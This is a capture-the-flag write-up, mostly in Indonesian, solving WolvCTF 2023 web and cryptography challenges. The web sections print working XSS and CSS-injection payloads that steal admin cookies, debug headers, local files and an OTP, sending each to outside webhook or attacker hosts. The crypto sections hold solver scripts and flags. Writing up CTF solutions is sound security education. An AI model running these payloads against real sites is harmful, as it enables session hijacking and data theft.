# Web
## Hidden CSS - web
### Description
Can you exfiltrate the flag from the private server?

Source code: [link](https://drive.google.com/file/d/1GGoxSjgLRZ3S_N6CdNX7rq4GNw96Dnpw/view)
### Exploit
Pada challenge ini kita akan diberikan source code. Di dalam source code tersebut kita akan mendapatkan bahwa flag terdapat pada `private-server.js`.

```javascript 
app.get('/css', function(req, res) {
    let prefix = '' + req.query.prefix
    console.log('visit to /css?prefix='+prefix)
    for (c of prefix) {
        const charCode = c.charCodeAt(0)
        if (charCode < 32 || charCode > 126) {
            prefix = 'illegal characters seen'
            break
        }
    }

    if (prefix.length > 20) {
        prefix = 'your prefix is too long'
    }

    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Content-Type', 'text/css');
    res.send(prefix + FLAG);
});
```
Di source code diatas kita bisa melihat security header yaitu `X-Content-Type-Options: nosniff` dan juga `Content-Type: text/css`, karna security header tersebut kita hanya bisa meload content sebagai css.

Kita bisa mengaksesnya dengan membaut server kita sendiri dimana nanti dari server kita bisa mengimport css dari `server-private` ke server kita dan memanfaatkan bot di `public-server` untuk melakukan csrf.

Pertama kita akan mebuat server yang didalamnya berisi payload html seperti berikut.

```html 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="http://0:1337/css?prefix=.foo{ content: '">
</head>

<body>
    <div class="foo"></div>
    <script>
        const foo = document.querySelector('.foo')
        const style = getComputedStyle(foo)
        fetch("https://eomv1kji1f5ppkx.m.pipedream.net?"+style.content) 
    </script>
</body>

</html>
```

Disini kita membuat seperti ini `    <link rel="stylesheet" href="http://0:1337/css?prefix=.foo{ content: '">` untuk melakukan request ke server private an tidak lupa kita juga menambahkan prefix `.foo{content:'` agar flag kita di baca sebagai valid css.

![](https://i.imgur.com/xSH9VL5.png)

## Zombie 101
### Description
Can you survive the Zombie gauntlet!?

First in a sequence of four related challenges. Solving one will unlock the next one in the sequence.

They all use the same source code but each one has a different configuration file.

This first one is a garden variety "steal the admin's cookie".

Good luck!

Please don't use any automated tools like dirbuster/sqlmap/etc.. on ANY challenges. They won't help anyway.

### Exploit
Untuk challenge ini kita hanya perlu mengambil admin cookie dengan memaanfaatkan XSS yang terdapat di endpoint `/zombie`

```html
<script>fetch("https://webhook?"+document.cookie)</script>
```

![](https://i.imgur.com/mwMvpIE.png)

![](https://i.imgur.com/Ol7AmaY.png)

Kemudian masukkan url dari page diatas di bagian berikut, maka nanti kita akan mendapatkan flagnya di webhook server.

![](https://i.imgur.com/DhzEndM.png)

## Zombie 201
### Description
Congratulations, you got the admin's cookie!

Can you do it again? It might be a little harder this time.

You are well on your way through the gauntlet. You can't stop now.

### Exploit
Berbeda dengan challenge yang pertama disini kita tidak bisa `document.cookie` untuk mengambil flagnya dikarenakan cookie dari flag yang di set httponly sehingga tidak bisa diakses dari javascript.

`bot.js`
```javascript
browser.setCookie({ name: 'flag', domain: hostname, path:'/', value: process.env.FLAG, httpOnly: httpOnly})
```

Tetapi kita bisa menggunakan fungsi debug yang berada di `index.js` untuk mendapatkan flagnya.

```javascript
// useful for debugging cloud deployments
app.get('/debug', function(req, res) {
    if (config.allowDebug) {
        res.send({"remote-ip": req.socket.remoteAddress, ...req.headers})
    }
    else {
        res.send('sorry, debug endpoint is not enabled')
    }
})
```

Jadi untuk mendapatkan flagnya kita bisa membuat request ke endpoint `/debug` untuk mendapatkan semua header dan juga flagnya.

Buat seperti berikut di endpoint `zombie` dan lakukan langkah-langkah seperti di challenge sebelumnya.

```javascript
<script>fetch("/debug").then(a=>a.text()).then(a=>fetch("https://webhook?"+a))</script>
```

Nanti kita akan mendapatkan flagnya di webhook server.

## Zombie 301
### Description
You did it again... nice job! The zombies are no problem for you.

Can you do it yet again?

You are half way through the gauntlet. You can do it!

### Exploit
Untuk challenge ini kita tidak bisa mengakses endpoint `/debug` dan juga mengakses flag dari javascript dikarenakan httponly.

Tetapi kita dapat memanfaatkan vulnerability yang terdapat di zombie js.

![](https://i.imgur.com/OJSsJpn.png)

Kita bisa payload seperti berikut untuk mendapatkan data dari sebuah request, termasuk juga cookienya.

```html 
<script>fetch("https://zombie-301-tlejfksioa-ul.a.run.app/").then((data) => fetch("https://webhook?c=".concat(JSON.stringify(data))));</script>
```

Kita masukkan payload tersebut ke endpoint `/zombie` dan kita seperti biasa.

![](https://i.imgur.com/sry1Qwe.png)

Setelah itu kita akan mendapatkan flagnya di webhook kita.

## Zombie 401
### Description
You are almost there. Only one more to go!

Can you find the secret flag and complete the zombie gauntlet?

You can do it!

### Exploit
Untuk challenge ini kita perlu untuk mengeksploitasi package zombie js lagi. Kita bisa mengeksploitasi ini dengan cara membaca file dengan protocol `file://`. Berikut payload yang saya gunakan untuk membaca flag.
```html 
<script>fetch("file:///ctf/app/config.json").then(a=>a.text()).then(a=>fetch("https://eogvtc165bf4gh5.m.pipedream.net?"+a))</script>
```


## Adversal - web
### Description
I added advertisements to my web application to serve one time passwords! I'm sure ads are secure, right?

source code: [link](https://drive.google.com/file/d/1GGoxSjgLRZ3S_N6CdNX7rq4GNw96Dnpw/view?usp=share_link)
### Exploit
Pada challenge ini kira akan diberikan link menuju web berikut.

![](https://i.imgur.com/AjwjtaG.png)


Di web tersebut kita tidak bisa melakukan XSS dikarenakan terdapat CSP `script-src: none`.

```javascript 
    res.set("Content-Security-Policy", "script-src 'none'; object-src 'none'; connect-src 'self';");

```

Tetapi kita bisa melakukan redirect menggunakan tag `meta`.

Jika kita lihat ke source code `index.js`, kita akan menemukan bahwa otp didapat dari output `page.$eval`.

```javascript
...snip...
        const ctx = await browser.createIncognitoBrowserContext()
        const page = await ctx.newPage()

        let otp = null;
        try {
            await page.setUserAgent('puppeteer');
            await page.goto(url, { timeout: 20000, waitUntil: 'networkidle2' })
            otp = await page.$eval("input", element=> element.getAttribute("value"));
...snip...
```

`page.$eval` memiliki fungsi seperti dibawah ini, dimana dia memiliki fungsi seperti document.querySelector.

![](https://i.imgur.com/UOAtrsc.png)

Jadi rencana eksploitasi kita kali ini dengan cara membuat redirect ke attacker site dimana disana ada tag input yang nanti akan memberikan otp palsu.

Berikut isi dari attacker server.

```html 
<html>
<head>
</head>
        <input id="otp" name="otp" type="text" value="foo" disabled />
</html>
```

Kita berikan input seperti berikut pada text area di halaman utama.

```
<link rel="stylesheet" href="http://tcp1p.com:4444">
<meta http-equiv = "refresh" content = "0; url = http://tcp1p.com:4444" />
```

Saya meberikan `<link>` tag auntuk memberikan delay pada bot, agar tidak terjadi race condition dan menyebabkan error di sisi bot.

![](https://i.imgur.com/qEZUoB2.png)

Kita inputkan foo, dan kita akan mendapatkan flagnya.

![](https://i.imgur.com/VE09H8F.png)

## Filter Madness
![](Pasted%20image%2020230323041112.png)

![](Pasted%20image%2020230323041128.png)

## adversal-revenge

[https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection](https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection "https://book.hacktricks.xyz/pentesting-web/xs-search/css-injection")

```python
from flask import Flask, request
import string
import time

app = Flask(__name__)

HOST = 'https://....ngrok.io'
OTP = ''


# Send the generated payload here to the admin bot
@app.route('/ad')
def ad():
    payload = ''
    for i in range(12):
        payload += f'<link rel="stylesheet" href="{HOST}/{i}" />'
    return payload, 200, {'Content-Type': 'text/plain'}


@app.route('/<int:style_i>')
def style(style_i: int):
    global OTP
    css = ''
    while len(OTP) != style_i:
        time.sleep(0.5 * style_i)
    for c in string.digits + string.ascii_letters:
        css += f'input[name=otp][value^={OTP}{c}] {{ background-image: url({HOST}/leak?otp={OTP}{c}); }}\n'
    return css, 200, {'Content-Type': 'text/css'}


@app.route('/leak')
def leak():
    global OTP
    OTP = request.args['otp']
    return 'OK'


if __name__ == '__main__':
    app.run(host='::', port=80)
```

# Cryptography

## keyexchange
```python
#!/opt/homebrew/bin/python3

from Crypto.Util.strxor import strxor
from Crypto.Util.number import *
from Crypto.Cipher import AES

n = getPrime(512)

s = getPrime(256)

a = getPrime(256)
# n can't hurt me if i don't tell you
print(pow(s, a, n))
b = int(input("b? >>> "))

secret_key = pow(pow(s, a, n), b, n)

flag = open('/flag', 'rb').read()

key = long_to_bytes(secret_key)
enc = strxor(flag + b'\x00' * (len(key) - len(flag)), key)
print(enc.hex())
```

cukup input b = 1 maka `secret_key = pow(s,a,n)`, sehingga kita hanya perlu melakukan `strxor(enc, pow(s,a,n))` saja.

```
== proof-of-work: disabled ==
278959578473535544583121308438016108719868858450069441387438003415119225406623824663506053283768701756055364347686940239674248847037602493881175105418381
b? >>> 1
7230f2cf7974acd16598584455c798b7290e8c73cb83021b6b8f9f4f5c0be7269ca07048daf4f482435c4584713463e126a3ea01fb79ee405925666ba0b1348d
```

berikut script solvernya:

```
from Crypto.Util.number import *
from Crypto.Util.strxor import strxor

secret_key = long_to_bytes(278959578473535544583121308438016108719868858450069441387438003415119225406623824663506053283768701756055364347686940239674248847037602493881175105418381)
enc = bytes.fromhex('7230f2cf7974acd16598584455c798b7290e8c73cb83021b6b8f9f4f5c0be7269ca07048daf4f482435c4584713463e126a3ea01fb79ee405925666ba0b1348d')

print(strxor(enc, secret_key))
```

flag = `wctf{m4th_1s_h4rd_but_tru5t_th3_pr0c3ss}`

## Z2kDH

output.txt:
```
99edb8ed8892c664350acbd5d35346b9b77dedfae758190cd0544f2ea7312e81
40716941a673bbda0cc8f67fdf89cd1cfcf22a92fe509411d5fd37d4cb926afd
```

Kita dapat melakukan discrete log menggunakan Sage untuk mendapatkan private exponent dari alice. kemudian melakukan exchange dengan public bob dan private exponent alice untuk mendapatkan flag, berikut script yang digunakan:

```python
def Z2kDH_exchange(public_result, private_exponent, modulus):
  return int(pow(public_result * 4 + 1, private_exponent, modulus)) // 4
  
n = 1 << 258
#menggeser ke kanan sebanyak 2 bit, karena hasil dari `Z2kDH_init` menghilangkan 2 bit terakhir
alice_pub = (0x99edb8ed8892c664350acbd5d35346b9b77dedfae758190cd0544f2ea7312e81 << 2) + 1
bob_pub = 0x40716941a673bbda0cc8f67fdf89cd1cfcf22a92fe509411d5fd37d4cb926afd

#discrete log
R = Integers(n)
A = R(5)
B = R(alice_pub)
alice_priv = B.log(A)
print(bytes.fromhex(hex(Z2kDH_exchange(bob_pub, alice_priv, n))[2:]))
```

flag: wctf{P0HL1G_H3LLM4N_$M4LL_pr1M3}

## Galois-t is this?
### Mendapatkan hkey
nilai `hkey = AES.encypt(b'\0' * 16)` sehingga untuk mendapatkan `hkey` kita harus tahu cara kerja dari fungsi `incr(nonce)`, yaitu pertama mengubah nonce menjadi long kemudian ditambah 1, setelah itu diubah menjadi byte dan diambil 16 byte terakhir. Oleh karena itu kita perlu melakukan encrypt dengan nonce : `'ff' * 16` dan pt : `'00' * 16` karena kita tahu kalau nonce akan di-increment menggunakan fungsi `incr(nonce)` sebanyak `numBlocks + 1` kemudian `enc[:16]` akan digunakan untuk tag dan sisanya (`enc[16:]`) akan digunakan untuk xor `pt` yang menjadi ciphertext nanti, oleh karena itu di sini pt : `'00' * 16` digunakan agar hasil `ct = hkey` tanpa perlu `strxor` untuk mendapatkan `hkey`.

### Membuat Tag
Sebelumnya, tujuan kita yaitu melakukan submit dengan nonce `'00'*15 + '01'`, ct : ciphertext dari 'heythisisasupersecretsupersecret' dalam bentuk hexa dan tag yang akan kita hitung ini. Kita tahu bahwa tag didapatkan dari `strxor(enc[:16], GHASH(hkey, header, ct))`, dan kita sudah mendapatkan `hkey` maka selanjutnya kita perlu mendapatkan `enc[:16]` dan `ct` dalam hal ini `enc[:16] = AES.encrypt(nonce) = AES.encrypt(b'\x00'*15 + b'\x01')` dan `ct = AES.encrypt('heythisisasupersecretsupersecret')`. Jadi, kita perlu melakukan encrypt dengan nonce : `'00' * 16` dan pt : `'00' * 16 + hex(bytes_to_long(b'heythisisasupersecretsupersecret'))[2:]`, karena mode enkripsi AES adalah mode ECB maka kita bisa mendapatkan `enc[:16]` dan `ct` dengan masing-masing `enc[:16] = bytes.fromhex(CT[:32].decode())` dan `ct = bytes.fromhex(CT[32:].decode())` sehingga kita dapat menghitung tag dengan `strxor(enc[:16], GHASH(hkey, header, ct)).hex()`. Setelah itu kita dapat melakukan submit dengan tag yang sudah kita dapatkan.

berikut script solvernya:
```python
from Crypto.Util.number import *
from Crypto.Util.strxor import *
from pwn import *

def GF_mult(x, y):
    product = 0
    for i in range(127, -1, -1):
        product ^= x * ((y >> i) & 1)
        x = (x >> 1) ^ ((x & 1) * 0xE1000000000000000000000000000000)
    return product

def H_mult(H, val):
    product = 0
    for i in range(16):
        product ^= GF_mult(H, (val & 0xFF) << (8 * i))
        val >>= 8
    return product

def GHASH(H, A, C):
    C_len = len(C)
    A_padded = bytes_to_long(A + b'\x00' * (16 - len(A) % 16))
    if C_len % 16 != 0:
        C += b'\x00' * (16 - C_len % 16)

    tag = H_mult(H, A_padded)

    for i in range(0, len(C) // 16):
        tag ^= bytes_to_long(C[i*16:i*16+16])
        tag = H_mult(H, tag)

    tag ^= bytes_to_long((8*len(A)).to_bytes(8, 'big') + (8*C_len).to_bytes(8, 'big'))
    tag = H_mult(H, tag)

    return tag

header = b'WolvCTFCertified'
    
r = remote('galois.wolvctf.io', 1337)

def encrypt(IV, pt):
    r.sendlineafter('>', b'1')
    r.sendlineafter('>', IV)
    r.sendlineafter('>', pt)
    r.recvuntil(b':')
    CT = r.recvuntil(b'\n')
    r.recvuntil(b':')
    TAG = r.recvuntil(b'\n')
    return (CT.strip(),TAG.strip())

def submit(IV, ct, tag):
    r.sendlineafter('>', b'2')
    r.sendlineafter('>', IV)
    r.sendlineafter('>', ct)
    r.sendlineafter('>', tag)
    r.interactive()

CT, TAG = encrypt(b'ff'*16, b'00'*16)
hkey = int(CT,16)
CT, TAG = encrypt(b'00'*16, b'00'*16 + hex(bytes_to_long(b'heythisisasupersecretsupersecret'))[2:].encode())
enc = bytes.fromhex(CT[:32].decode())
ct = bytes.fromhex(CT[32:].decode())
tag = strxor(enc, long_to_bytes(GHASH(hkey, header, ct))).hex()
submit(b'00'*15+b'01',CT[32:],tag.encode())
```

flag = `wctf{th13_sup3r_s3cr3t_13nt_v3ry_s3cr3t}`

# Our Team Writeup

@daffainfo

| Category | Challenge |
| --- | --- |
| Forensics | [important_notes](/WolvCTF%202023/important_notes/)
| OSINT | [WannaFlag III: Infiltration](/WolvCTF%202023/WannaFlag%20III%20Infiltration/)
| Beginner / Rev | [yowhatsthepassword](/WolvCTF%202023/yowhatsthepassword/)
| Misc | [Switcharoo](/WolvCTF%202023/Switcharoo/)